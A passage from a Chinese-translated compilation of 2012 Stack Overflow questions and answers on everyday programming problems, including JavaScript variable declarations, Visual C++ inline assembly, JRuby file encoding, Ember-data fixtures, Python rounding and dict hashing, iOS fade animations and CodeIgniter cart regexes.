    {
        title: 'My second awesome blog post',
        thumbnail: 'images/joker.jpg',
    }
];
var template = $.trim($('#blogTemplate').html());
var frag = ''; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:27:16.593

您不需要在它们前面加上`var`：

```
var a, b, c; 
```

已经相当于：

```
var a;
var b;
var c; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T14:29:13.177

它们已经是本地的并且`var`在它们前面 - 请注意使所有变量成为声明和定义的单个列表的逗号，您似乎没有注意到这一点，因为它们被分成几行：

```
var content = [ /* multi-line array */ ], template = $.trim( $('#blogTemplate').html() ), frag = ''; 
```

自然，`var`在列表中添加更多是不好的语法。

# c - Visual-C++ 内联汇编程序编译不正确

> ID：13514682
> 
> 赞同：2
> 
> 时间：2012-11-22T14:22:55.347
> 
> 标签：c, windows, x86, inline-assembly

最近我向社区询问了两个偏移量的差异[Visual-C++ inline assembler 两个偏移量的差异](https://stackoverflow.com/questions/13420744/visual-c-inline-assembler-difference-of-two-offsets)并很快得到了答复，非常感谢。现在我遇到了其他问题，这更糟。

我有一个类似的指令

```
 ..naked...
    __asm{
    ...
    mov eax, dword ptr [ebx + offset data1]
    ...
    } 
```

真正的问题是它被编译为

```
 mov eax, [offset data1] 
```

此行没有编译器警告（/WAll 模式），但代码发生了很大变化 - 想象一下，它完全被抛出了 ebx + part！默默。它是编译器错误还是功能？也许我必须指定一些额外的标志？

问题仅在于偏移量，因为

```
 mov eax, dword ptr [ebx + 0xconst] 
```

编译正确。

是的，我可以使用代码

```
 mov eax, offset data1
    add eax, ebx
    mov eax, [eax] 
```

但是那时有很多代码需要更改。困扰我的是没有任何警告。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T14:28:05.990

最后，我在 MSDN 论坛上找到了答案。如果您只使用 mov eax, [ebx + data1location]，而不是 mov eax, [ebx + offset data1location]，则编译正确。然而，'offset' 是 MS C++ 编译器应该接受的 MASM 语法的合法关键字。但是随后“ebx +”被默默地扔掉了。

# file-io - 无法使用 JRuby 打开带有特殊字符的文件

> ID：13514686
> 
> 赞同：0
> 
> 时间：2012-11-22T14:23:03.943
> 
> 标签：file-io, encoding, jruby

以下程序在 ruby​​ 上运行良好，但在访问具有特殊字符（如我用于测试的文件，称为“mão.txt”）的文件时，JRuby 出现问题：

```
# coding: utf-8

puts "(A) #{__ENCODING__}"

puts "(B)" + "".encoding.to_s
puts "(C)" + String.new.encoding.to_s

Dir.glob("./fixtures/*").each do |f|
    puts "(D)" + f.encoding.to_s + "  " + f
    File.open(f)
    g = File.expand_path(f)
    puts "(E)" + g + " " + g.encoding.to_s
    File.open(g)
end 
```

JRuby 的结果是：

```
(A) UTF-8
(B)UTF-8
(C)ASCII-8BIT
(D)ASCII-8BIT  ./fixtures/mão.txt~
Errno::ENOENT: No such file or directory - ./fixtures/mÃ£o.txt~
  initialize at org/jruby/RubyFile.java:315
        open at org/jruby/RubyIO.java:1176
      (root) at encoding.rb:10
        each at org/jruby/RubyArray.java:1612
      (root) at encoding.rb:8 
```

我正在使用 Ubuntu 12.10、JRuby 1.7.0 和 java 1.7.0_09

我计划将应用程序与 Warble 一起打包，所以我担心命令行参数不是一个选项。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:28:26.107

这是一个报告的[错误](https://github.com/jruby/jruby/issues/403)`Dir.glob`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T16:43:17.287

正如塞巴斯蒂安所说，这是一个已知的错误。

我实际上找到了解决此错误的方法。而不是使用 Dir.glob，在这种情况下，我想要目录中的每个文件，我可以简单地使用 Dir.entries，它工作正常。

程序可以更改为：

```
# coding: utf-8
path = File.expand_path(File.dirname(__FILE__))
puts "(A) #{__ENCODING__}"

puts "(B)" + "".encoding.to_s
puts "(C)" + String.new.encoding.to_s

dir = "#{path}/fixtures/"
entries = Dir.entries(dir) - ['.', '..']
entries.each do |f| 
    puts "(D)" + f.encoding.to_s + "  " + f
    file = "#{dir}/#{f}"
    puts "(E)" + file.encoding.to_s + "  " + file
    #f.encode("UTF-8")
    File.open(file)
    g = File.expand_path(file)
    puts "(F)" + g + " " + g.encoding.to_s
    File.open(g)
end 
```

# ember.js - Emberjs- 使用夹具运行 ember-data 返回 DS.Store 没有方法“创建”

> ID：13514688
> 
> 赞同：1
> 
> 时间：2012-11-22T14:23:12.273
> 
> 标签：ember.js, ember-data

这个**[小提琴](http://jsfiddle.net/egKAH/1/)**它返回如下所示的错误：

```
**UnTypeError: Object <DS.Store:ember270> has no method 'create'** 
```

**小提琴中的代码粘贴在下面**：

```
 App = Ember.Application.create();

  App.ApplicationController  = Em.Controller.extend({ });

  App.Store = DS.Store.create({
   revision: 7,
   adapter: DS.FixtureAdapter.create()
  });

 //models
 App.Account = DS.Model.extend({
   name: DS.attr('string'),
   user: DS.hasMany('App.User'),
   project: DS.hasMany('App.Project')   
 });

App.User = DS.Model.extend({
  name: DS.attr('string'),
  email: DS.attr('string'),
  password: DS.attr('string'),
  isSelected: DS.attr('boolean',{defaultValue: false }),
  isAdmin: DS.attr('boolean',{defaultValue: false }),
  isOwner: DS.attr('boolean',{defaultValue: false }),                     
  account: DS.belongsTo('App.Account'),
  project: DS.hasMany('App.Project')   
});

App.Project = DS.Model.extend({
 name: DS.attr('string'),
 account: DS.belongsTo('App.Account'),
 user: DS.belongsTo('App.User')   
});

//fixtures for the models

App.Account.FIXTURES = [
 {
    "id": 1,
    "name": "United-shoes"
 },

 {
    "id": 2,
    "name": "Boosters"
 }
];

App.User.FIXTURES = [
  {
    "id": 1,
    "name": 'James',
    "email": 'Denis',
    "password": 'abc',
    "isAdmin": true,
    "account_id": 1
  },

  {
    "id": 2,
    "name": 'mile',
    "email": 'terrence',
    "password": '123',
    "account_id": 2
  }    
 ];

 App.Project.FIXTURES = [
   {
    "id": 1,
    "name": "Increase market share",
   "user_id": 1,
   "account_id": 1
   },

  {
    "id": 2,
    "name": "optimise customers funnel capture",
    "user_id": 2,
    "account_id": 2
  }

];

//ember-data stuff ends

App.ApplicationView = Em.View.extend({
 templateName: 'application'       
});

App.ApplicationView = Ember.View.extend({
   templateName:  'application'
});

App.AccountController = Ember.ArrayProxy.extend({

});

App.AccountView = Ember.View.extend({
 templateName: 'account'  
});

App.UserController = Ember.ArrayProxy.extend({
 // content: 

});

App.UserView = Ember.View.extend({
 templateName: 'user'  
});

App.ProjectController = Ember.ArrayProxy.extend({

});

App.ProjectView = Ember.View.extend({
 templateName: 'project'  
});

App.Router = Em.Router.extend({
  enableLogging: true,
  location: 'history',
  root: Em.Route.extend({
     route: '/',
     index: Em.Route.extend({
       route: '/',
       connectOutlets: function(router) {
         router.get('applicationController').connectOutlet(
  'account');
        router.get('applicationController').connectOutlet(
  'user', App.Store.findAll(App.User));              
      }            
    }),               

    account: Em.Route.extend({
      route: '/account',

        index: Em.Route.extend({
            route: '/'
        })
    }),

    user: Em.Route.extend({
      route: '/user',

        index: Em.Route.extend({
            route: '/'
        })
    }),

    project: Em.Route.extend({
      route: '/project',

        index: Em.Route.extend({
            route: '/'
        })
    })

  }) 
});​ 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T15:03:11.697

`DS.Store`将实例重命名`App.Store`为`App.store`

小提琴：http: [//jsfiddle.net/egKAH/2/](http://jsfiddle.net/egKAH/2/)

我认为`App.Store`是保留

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-03T22:21:00.147

这不再是真的。[http://emberjs.com/api/data/classes/DS.Store.html](http://emberjs.com/api/data/classes/DS.Store.html)

App.Store 是正确的。

# asp.net - 通过 Web 表单模板在 AspNet OpenAuth 登录后获取 User.Identity.Name

> ID：13514697
> 
> 赞同：1
> 
> 时间：2012-11-22T14:23:40.013
> 
> 标签：asp.net, webforms

我在 VS2012 中使用 Web 表单模板并查看 OpenAuth 代码。

我希望在外部登录成功后存储一些外部数据，但是在调试期间无法看到如何在有效外部登录后的代码执行过程中获取登录的用户名 -

ProcessProviderResult - if (OpenAuth.Login(authResult.Provider, authResult.ProviderUserId, createPersistentCookie: false))

CreateAndLoginUser() - if (OpenAuth.Login(ProviderName, ProviderUserId, createPersistentCookie: false))

在这些调用之后，没有 User.Identity.Name 并且用户名尚未经过身份验证，那么我怎样才能获得membershipusername？它似乎是在重定向后登录的（我真的必须在会话中存储一些东西并在重定向后将其插入吗？我认为我做错了）。

OpenAuth上有什么方法。？？或等效的我需要调用以获取用户名，以便我可以根据需要存储我的数据。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T15:14:34.843

`User.Identity.Name`只会在返回时由 Forms Auth 身份验证提供程序填充（在客户端被重定向之后，正如您所指出的那样）。

但是在鉴权过程中，在重定向前的OpenAuth代码中，用户名只是简单的用`AuthenticationResult.UserName`（即：ExternalLoginLandingPage.aspx.cs中的authResult.UserName）来表示。

# css - 调整 Nivo 滑块大小问题

> ID：13514700
> 
> 赞同：0
> 
> 时间：2012-11-22T14:23:42.417
> 
> 标签：css, nivo-slider

我的 NIVO 滑块有问题：

[http://rusticblonde.hostizzo.com/](http://rusticblonde.hostizzo.com/)

我已经设法调整了盒子的大小以及图像加载时，但是当它改变时，变化的图像仍然很小。

我需要修改高度来解决这个问题的任何想法？

当我将它包装在页面包装器中时，它似乎也会创建一个滚动条。

NIVO 滑块是否会根据其包含的 DIV 的宽度和高度调整自身的大小？如果是这样，我想我会编辑这个。

# android - 如何在加速度计值变化时平滑移动物体

> ID：13514703
> 
> 赞同：1
> 
> 时间：2012-11-22T14:24:01.520
> 
> 标签：android, iphone, windows-phone-7, windows-8, monogame

如果我正在移动物体，我正在编写游戏。我想让物体移动得非常顺畅，就像加速度计的微小变化也应该更新物体的位置。

现在如何处理加速度计噪声？也就是说，即使我不移动设备，加速度计事件也会继续触发。

我已经浏览了它，但找不到任何好的解决方案。

我也尝试过设置阈值等解决方案，或保留最后更新的值，如果更改则更新位置等。但这些无助于平滑移动。

iphone和android上的游戏就是这样做的。物体移动非常顺畅。

任何人都可以帮忙吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-20T18:53:42.613

您应该使用 0 左右的阈值（或不移动时获得的值），然后在克服它时根据设备的倾斜度修改对象的速度矢量，这将创建平滑的运动。

# random - Perlin Noise：计算网格点的伪随机梯度

> ID：13514705
> 
> 赞同：1
> 
> 时间：2012-11-22T14:24:04.287
> 
> 标签：random, vector, gradient, noise, perlin-noise

我似乎在理解[这篇](http://webstaff.itn.liu.se/~stegu/TNM022-2005/perlinnoiselinks/perlin-noise-math-faq.html#toc-algorithm)Perlin Noise 文章时遇到了一些问题。我需要一些帮助来理解计算每个边界点的伪随机梯度是如何工作的。作者给出了函数：

```
g(xgrid, ygrid) = (gx, gy) 
```

然后他给出了图像：

![4个伪随机梯度？](../Images/f50689c24670d7282841361600805285.png)

我理解这篇文章的其余部分，但我不知道他是如何从每个边界点生成这些随机梯度的。协助将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:35:45.183

> 但我不知道他是如何从每个边界点生成这些随机梯度的。

从文章中，它使用了一个始终具有相同种子的伪随机数生成器，并始终在同一个网格上计算它，因此

> 我们的意思是 g 具有随机性的*外观*，但重要的考虑是每次计算时它总是为同一个网格点返回相同的梯度。同样重要的是，每个方向都有平等的机会被选中。

所以可能它会做类似的事情

```
srand(CONSTANT_VALUE);

for (y = 0; y < GridHeight; y++)
{
    for (x = 0; x < GridWidth; x++)
    {
        r1 = rand();
        r2 = rand();
        gradient[y][x] = some_function(r1, r2);
    }
} 
```

所以每个点的梯度都是伪随机的，对于相同的 x 和 y，它总是相同的，并且分布均匀。然后它访问矩阵`gradient`以运行其余的计算。

# python - python的round()函数不起作用？

> ID：13514706
> 
> 赞同：2
> 
> 时间：2012-11-22T14:24:12.760
> 
> 标签：python

下面是我的程序，用于查找作为系列给出的大约 5000 次多项式的近似根：

```
def s(r, z):
    sm = 0
    for k in range(1, z+1):
        sm += (900-3*k) * r ** (k-1)
    return sm

target = -600000000000

n = 1
dr = .125
curr = 0
while abs(curr - target) > 1:
    curr = s(n, 5000)
    if curr > target : n+= dr
    else : n-=dr
    dr /= 2 
```

我希望它四舍五入到小数点后 12 位，因此

```
print round(n, 12) 
```

这给了我：

```
1.00232210863 
```

number 足够近似，但现在四舍五入为 12 位。我启动了 python 控制台并自己找到了它：

```
>>> n
1.0023221086328755
>>> round(n, 12)
1.002322108633 
```

为什么我的 round() 函数只能在 python 控制台提示符内工作？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-22T14:28:40.463

默认情况下，python 的 print 在打印时会将数字四舍五入为 11 位。试试吧

```
print '%0.12f'%n 
```

更清楚一点，当您在交互式控制台中并执行以下操作时：

```
>>> x = 1.123456789012345
>>> x
1.123456789012345
>>> print x
1.12345678901 
```

请记住，第一个调用实际上是调用

```
x.__repr__() 
```

它将尽可能多地打印有关 x 的信息，而 print 语句转换为

```
print x.__str__() 
```

如果需要，int 上的构建**str** () 方法会四舍五入到 11 位。您可以使用 python 的 % 格式强制任意数量的数字，如上所示。

# objective-c - 如何创建可以在中间停止而不跳到动画结尾的淡入/淡出动画？

> ID：13514707
> 
> 赞同：0
> 
> 时间：2012-11-22T14:24:13.947
> 
> 标签：objective-c, ios, core-animation

我需要淡入淡出图像，在某些情况下我需要停止动画并反转它。例如：图像开始从 alpha 0 淡入到 1，然后在 0.4，由于某些用户输入，我需要将其淡出，从 0.4 到 0；

我尝试使用 animateWithDuration 和 stopAllAnimations，但结果是动画跳转到目标 alpha (= 1)。

想到了CADisplayLink，自己一帧一帧地做动画，后来看了觉得性能不太好。我尝试使用 CALayers 和 PresentationLayer，但它变得复杂，并且无法正常工作。

最好的方法是什么？任何人都可以通过一个小例子来帮助我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T16:28:27.483

UIView animateWithDuration 方法在幕后的图层上创建 Core Animation 对象以使动画正常工作。CAAnimation 动画视图层的presentationLayer。您可以查询表示层以获取动画进行时的状态。

这是我的建议：

像现在这样使用 animateWithDuration:animations: 。

如果您需要在飞行中停止动画，请获取视图层的表示层，并捕获 alpha 属性的值。

然后将视图的不透明度设置为“in-flight”值并向图层发送 removeAllAnimations 消息。这将产生在当前状态停止动画的效果。

最后，使用新的反向动画调用新的 animateWithDuration:animations: 语句。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:58:40.120

我使用此代码淡入淡出

```
-(void)fadeOut:(UIView*)viewToDissolve withDuration:(NSTimeInterval)duration
       andWait:(NSTimeInterval)wait FadeLevel:(float) fadeLevel
{
    [UIView beginAnimations: @"Fade Out" context:nil];
    [UIView setAnimationDelay:wait];
    [UIView setAnimationDuration:duration];
    viewToDissolve.alpha = fadeLevel;
    [UIView commitAnimations];
}

-(void)fadeIn:(UIView*)viewToFadeIn withDuration:(NSTimeInterval)duration
      andWait:(NSTimeInterval)wait FadeLevel:(float) fadeLevel
{
    [UIView beginAnimations: @"Fade In" context:nil];
    [UIView setAnimationDelay:wait];
    [UIView setAnimationDuration:duration];
    viewToFadeIn.alpha = fadeLevel;
    [UIView commitAnimations];
} 
```

只需在将采用浮点数的方法上添加一个额外的变量，然后将淡入或淡出设置为您想要的任何内容。希望有帮助！

编辑：只是更改了代码以向您展示它的外观，只是自己测试了一下，似乎工作得很好

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T16:56:24.843

要停止动画，我所做的是使用参数调用新的 UIView 动画： UIViewAnimationOptionBeginFromCurrentState 以便它覆盖以前的动画。

所以我有一种方法可以将动画从 X 值启动到 Y 值。另一种方法可以中断第一个动画。每当我点击“暂停”按钮时，都会调用第二种方法。

当我想恢复动画时，我会再次调用 start animations 方法，使用对象所在状态的新 X 和 Y 值。

以块格式为我的 UIImageView 对象设置动画的代码：

```
[UIView animateWithDuration: 5
                      delay: 0.0
                    options: UIViewAnimationOptionCurveLinear
                 animations: ^{

                                  self.center = destinationPosition;  

                             }
                 completion:nil]; 
```

这是停止/中断代码：

```
UIImageView *currentPosition = [[UIImageView alloc] initWithFrame:[[self.layer presentationLayer] frame]];

                destinationPosition.x = currentPosition.center.x;
                destinationPosition.y = currentPosition.center.y;

                [UIView animateWithDuration: 0.1
                                      delay: 0.0
                                    options: UIViewAnimationOptionCurveLinear | UIViewAnimationOptionBeginFromCurrentState
                                 animations: ^{

                                     self.center = destinationPosition;

                                 } completion:nil]; 
```

在这段代码中，我使用图层表示方法来了解对象在动画期间的最后一个值，因此我可以在用户恢复游戏时从该点开始制作动画。这是因为该对象似乎存储了预计的目标值，我不得不用“此刻”值更新它。

请注意，停止动画代码的持续时间仅为 0.1。所以它就像新动画从它被发现的状态（UIViewAnimationOptionBeginFromCurrentState）覆盖了初始动画。该值非常短，因此它恰好将动画“停止”在它所在的位置。

我不知道这是否是最好的方法，但它对我来说很好。

# xcode - SVN 结帐不适用于 Xcode

> ID：13514710
> 
> 赞同：1
> 
> 时间：2012-11-22T14:24:22.720
> 
> 标签：xcode, svn, xcode4, svn-checkout

每当我尝试从 Xcode 4.5 签出项目时，我会在一段时间后收到“请求超时”的错误消息（尽管该过程不会停止，它会继续尝试而没有得到任何东西）。

该项目可通过其他 svn 客户端（如版本）访问，并且其地址的证书在钥匙串中设置为“受信任”。

我什至尝试使用其他人的 Xcode，同时复制完全相同的步骤，另一台笔记本电脑返回成功结帐......

请帮忙 ？

谢谢。

# python - 正确格式化 multipart/form-data 正文

> ID：13514713
> 
> 赞同：9
> 
> 时间：2012-11-22T14:24:24.740
> 
> 标签：python, http, amazon-s3, mime, multipartform-data

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T22:18:24.437

这是一个占位符答案，描述了我在等待对我的一些问题的权威输入时所做的事情。如果它表明这种方法在至少一个设计决策中是错误的或不适合的，我将很乐意接受不同的答案。

[这](https://github.com/gagern/github-tools/blob/master/github-upload.py)是我用来根据我现在的口味进行这项工作的代码。我做了以下决定：

> 我可以为我的文本字段使用 8 位数据并且仍然符合规范吗？

我决定这样做。至少对于这个应用程序，它确实有效。

> 我可以让电子邮件包将我的文本字段序列化为 8 位数据而无需额外编码吗？

我没有找到办法，所以我正在做自己的序列化，就像我在这上面看到的所有[其他食谱一样。](http://code.activestate.com/recipes/146306-http-client-to-post-using-multipartform-data/)

> 我也可以避免对二进制文件内容进行 base64 编码吗？

至少在我的单个应用程序中，只需以二进制形式发送文件内容似乎就足够了。

> 如果可以避免，我应该将 Content-Transfer-Encoding 编写为 8 位还是二进制？

正如[RFC 2045 第 2.8 节](https://www.rfc-editor.org/rfc/rfc2045#section-2.8)所述，该`8bit`数据受到 CRLF 对之间的 998 个八位字节的行长限制，我认为这`binary`是更通用的，因此这里的描述更合适。

> 如果我必须自己序列化正文，我怎么能单独使用 email.header 包来格式化标题值？

正如已经在我的问题中编辑的那样，[`email.utils.encode_rfc2231`](http://docs.python.org/3/library/email.util.html#email.utils.encode_rfc2231)对此非常有用。我首先尝试使用 ascii 进行编码，但在非 ascii 数据或双引号字符串中禁止使用的 ascii 字符的情况下使用该方法。

> 是否有一些实现已经完成了我想做的所有事情？

不是我知道的。不过，请其他实现采用[我的代码](https://github.com/gagern/github-tools/blob/master/github-upload.py)中的想法。

* * *

*编辑：*

多亏了[这条评论](https://github.com/facebook/tornado/pull/869#issuecomment-23632083)，我现在知道将 RFC 2231 用于标头并未被普遍接受：当前的 HTML 5 草案[禁止使用](http://www.w3.org/html/wg/drafts/html/master/forms.html#multipart-form-data). 它也被认为[会在野外引起问题](https://stackoverflow.com/q/20591599/1468366)。但是由于 POST 标头并不总是对应于特定的 HTML 文档（例如考虑 Web API），我也不确定在这方面我是否会信任该草案。也许正确的方法是同时给出编码和未编码的名称，就像[RFC 5987 第 4.2 节](https://www.rfc-editor.org/rfc/rfc5987#section-4.2)所建议的那样。但是该 RFC 是针对 HTTP 标头的，而 multipart/form-data 标头在技术上是 HTTP 正文。因此，该 RFC 不适用，而且我不知道有任何 RFC 明确允许（甚至鼓励）同时对多部分/表单数据使用两种形式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T19:01:10.090

您可能想[从一个 Python 脚本问题中查看使用 POST 发送文件，该](https://stackoverflow.com/questions/68477/)问题指向[Requests](http://requests.readthedocs.org/en/latest/)库，该库正在成为 http 最常用的 Python 库。如果您在那里找不到所有需要的功能并决定自己实现它，我鼓励您将它贡献给这个项目。

# python - 在字典中覆盖 Python 的散列函数

> ID：13514716
> 
> 赞同：8
> 
> 时间：2012-11-22T14:24:39.153
> 
> 标签：python, hash, dictionary, hashtable

我正在尝试为一些我将散列到字典中的对象创建一个自定义散列函数。散列函数是唯一的（不是标准的 Python 函数）。这对我来说非常重要：使用独特的功能。每个键的值都是一个列表。

假设我覆盖`__hash__`并最终得出一个对象的正确哈希数。将：

```
dict = {}
dict[number_here] = value 
```

将值散列到位置 number `number_here`，还是仍然在 Python 的哈希表将为该数字计算的位置？

打印`dict`只显示项目而不是它们的位置。但是，当我这样做时`hash(4)`，结果是 4。所以我假设这意味着整数被散列到它们各自的位置？

如果我错了，有人可以验证我的发现或向我解释吗？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-22T14:26:12.617

python`dict`实现使用哈希值来基于键稀疏存储值并避免该存储中的冲突。它以 的结果`hash()`作为*起点*，它不是确定的位置。

因此，尽管`hash(4)`返回`4`，但底层 C 结构中的确切“位置”也基于已经存在的*其他*键以及当前表的大小。例如，python 哈希表会根据需要调整大小（添加项目）。

由于 dict 没有顺序，这不是你需要担心的事情，也不需要影响。如果您需要在 dict 中排序，请改用`collections.OrderedDict()`实现，它会单独跟踪排序。

### python哈希表实现细节

您可能想了解哈希表在[Wikipedia](http://en.wikipedia.org/wiki/Hash_table)上的工作原理；Python 使用开放寻址来实现它。

当在表中选择一个槽时，哈希值（一个整数）和当前表大小的模被取，因此在一个大小为 32 的表上，所以 key `45`，哈希值`45`最初将存储在槽 14 中。

如果发生冲突（槽 14 中已经存储了其他内容，并且不是整数`45`），则槽值会*受到干扰*，直到找到空槽或找到相同的键。扰动是通过以下公式完成的：

```
perturb = slot = hash
while slot_is_full and item_in_slot_is_not_equal_to_key:
    slot = (5*slot) + 1 + perturb
    perturb >>= 5 
```

因此，当发生冲突时，会以越来越小的步长选择另一个槽，直到它扫描整个表。请注意，如果需要，表格已经调整大小以腾出空间。

为了使其正常工作，自定义类型既需要一个[`__hash__()`](http://docs.python.org/2/reference/datamodel.html#object.__hash__)方法*，也*需要实现[`__eq__()`](http://docs.python.org/2/reference/datamodel.html#object.__eq__)来确定两个实例是否代表同一个键。匹配哈希值是*不够*的。为了让`dict`实现考虑两个实例来表示完全相同的键，它们的哈希值必须匹配，并且它们必须为`==`相等运算符返回 True。这样的对象被认为是可[散列](http://docs.python.org/2/glossary.html#term-hashable)的。

（对于 Python 2.x，实现[`__cmp__()`钩子](http://docs.python.org/2/reference/datamodel.html#object.__cmp__)而不是实现`__eq__()`; 在 Python 3 中已删除对此的支持）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-18T14:46:28.063

Martijn Pieters 给出了一个很好的答案。我只是想补充一点，[CPython 源代码](http://hg.python.org/cpython/file/tip/Objects/dictobject.c)有很好的文档记录，也是查看 Python Dictionary 实现细节的好地方。最后我检查了一下，相关的评论在第 33-135 行。

# ios - 当 facebook 自动重定向到 m.facebook 时，共享按钮的参数未传递

> ID：13514719
> 
> 赞同：1
> 
> 时间：2012-11-22T14:24:50.730
> 
> 标签：ios, facebook, mobile

我有一个基于网络的平台，在移动设备上显示一个共享按钮。我传递了正确的 FB 所需的参数，以便共享以预定义的 URL、文本和缩略图图像打开。

在移动设备（特别是基于 iOS 的 iphone 和 ipad）上查看网站时，FaceBook 会自动检测到它是移动设备并切换到 m.facebook。但是这样做，我发送的所有参数都丢失/忽略了。

有谁知道这是否是 Facebook 错误，或者是否有一组特定于 m.facebook 网站的新参数？如果我将 f= 行更改为 m.facebook.com 似乎没有什么不同。

我发送以下共享命令 [再次，它在任何常规网络浏览器上都可以正常工作]

```
function doShare() {
    var d = document;
    var f = 'http://www.facebook.com/share';
    var l = d.location, e=encodeURIComponent;
    var p = '.php?src=bm&v=4&i=1262250767&s=100&p[url]=http%3A%2F%2Fqa2%2Eclear%2Dmenu%2Ecom%2FrestHome%2Ephp%3Fr%3D12&p[images][0]=http%3A%2F%2Fqa2%2Eclear%2Dmenu%2Ecom%2Fimages%2FrestLogos%2Flogo%2D12%2Ejpg&p[title]=Clear-Menu:+Novotel+Hotel+--+Netherlands+--+Den+Haag&p[summary]=This+is+marketing+text+that+will+be+included+on+a+FB+share+feed.';
    1;

    try {
        if (!/^(.*\.)?facebook\.[^.]*$/.test(l.host))
            throw(0);
        share_internal_bookmarklet(p)
    }
    catch(z) {
        a=function() {
            if (!window.open(f+'r'+p,'sharer','toolbar=0,status=0,resizable=1,width=626,height=436')) {
                l.href=f+'r'+p;
            }
        };
        if (/Firefox/.test(navigator.userAgent)) {
            setTimeout(a,0);
        }
        else {
            a();
        }
    }
    void(0);
} 
```

# codeigniter - 如何在同一个控制器编码器中加载多个模型

> ID：13514730
> 
> 赞同：0
> 
> 时间：2012-11-22T14:25:41.057
> 
> 标签：codeigniter

如何在 codigniter 中加载多个模型

类 c_home 扩展 CI_Controller {

```
 function __construct(){
           parent::__construct();

           $this->load->model('mhome/m_home');
           $this->load->model('mcommon/m_common');

         } 
```

我有两个模型 m_home 和 m_common m_home 加载但 m_common 未加载给出错误消息：未定义的属性：c_home::$m_common

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T16:54:23.550

检查模型是否正确扩展了 m_common 的 CI_Model

例子：

```
 class M_common extends CI_Model{    

 } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-08-03T11:42:19.353

您可以尝试这种方式加载多个模型：

```
function __construct(){
   parent::__construct();

    $this->load->model(array('mhome/m_home','mcommon/m_common'));

} 
```

# php - CodeIgniter 购物车类阿拉伯语正则表达式

> ID：13514736
> 
> 赞同：0
> 
> 时间：2012-11-22T14:25:56.797
> 
> 标签：php, codeigniter, unicode

system/library 下的 Cart.php 有一个正则表达式模式定义，它不允许我使用阿拉伯语作为名称值。这有效：

```
$data = array(
  'id' => "221212",
  'qty' => 1,
  'price' => 21.2,
  'name' => 'dasdasdas'
); 
```

但这失败了，因为名称中有阿拉伯语：

```
$data = array(
  'id' => "221212",
  'qty' => 1,
  'price' => 21.2,
  'name' => 'عمر'
); 
```

现在在 Cart.php 类中，我发现了以下内容：

```
// These are the regular expression rules that we use to validate the product ID and product name
  var $product_id_rules = '\.a-z0-9_-';
  // alpha-numeric, dashes, underscores, or periods
  var $product_name_rules = '\.\:\-_a-z0-9';
  // alphanumeric, dashes, underscores, colons or periods 
```

我关心名称规则。显然这是问题所在，因为稍后会进行检查：

```
if ( ! preg_match("/^[".$this->product_name_rules."]+$/i", $items['name'])) {
  log_message('error', 'An invalid name was submitted as the product name: '.$items['name'].' The name can only contain alpha-numeric characters, dashes, underscores, colons, and spaces');
  return FALSE;
} 
```

如何替换名称规则字符串以使用阿拉伯语？我的正则表达式背景很差，所以请帮忙。

谢谢！

![在此处输入图像描述](../Images/5880c896d1bce1dcc50d8f3b4e3ae23b.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:40:44.087

`$product_name_rules`如果您将（部分）模式更改为以下内容，它将起作用：

```
var $product_name_rules = '\.\:\-_a-z0-9\p{Arabic}'; 
```

...然后将`/u`修饰符添加到实际使用的模式中`preg_match`：

```
if ( ! preg_match("/^[".$this->product_name_rules."]+$/iu", 
            $items['name'])) { ... } 
```

引用[文档](http://php.net/manual/en/reference.pcre.pattern.modifiers.php)：

> **u (PCRE_UTF8)**
> 
> 此修饰符打开与 Perl 不兼容的 PCRE 的附加功能。模式字符串被视为 UTF-8。此修饰符在 Unix 上的 PHP 4.1.0 或更高版本以及 win32 上的 PHP 4.2.3 中可用。自 PHP 4.3.5 起检查模式的 UTF-8 有效性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T14:47:02.837

如果要接受其他字符，则必须在加载购物车库后修改 $this->cart->product_name_rules 。

```
$this->load->library('cart');
$this->cart->product_name_rules = '\.a-z0-9_-\p{Arabic}'; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T01:21:03.150

将正则表达式更改`product_name`为以下内容，这允许所有：

```
var $product_name_rules = '^.' 
```

# javascript - 加载大量数据过程的图像未由 javascript 显示

> ID：13514738
> 
> 赞同：1
> 
> 时间：2012-11-22T14:26:01.897
> 
> 标签：javascript, jquery

我想`loading`在处理大量数据之前显示图像并在完成后将其删除，所以我编写了以下代码：

```
$("a#myId").click(function(){
    $(this).append('<img src="loading.gif" />');
    ...
    ... doning some heavy data process (that take more that 5 seconds) here ...
    ...
    $("img[src='loading.gif']").remove();
}); 
```

但加载不显示！（当我离开`$(this).append('<img src="loading.gif" />');`并删除下一行时，正确加载图像显示）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T15:04:37.780

刚刚测试了这个，它可以工作。 [http://jsfiddle.net/Z3MX​​J/](http://jsfiddle.net/Z3MXJ/)

```
<a id="myId" href="#">Click me</a>
<div id="target"></div>
<script>
$("#myId").click(function(){
    $('#target').append('<img src="http://www.consafelogistics.com/gfx_portal/loading.gif" />');

    var url = 'http://onerahi.cabu.school.nz/files/2012/09/goes-12-firstimage-large081701.jpg',
        img = $('<img>');
        img.hide();
        img.bind('load', function(){$(this).fadeIn();
            $("img[src$='loading.gif']").hide();
        });
        $('body div#target').append(img);
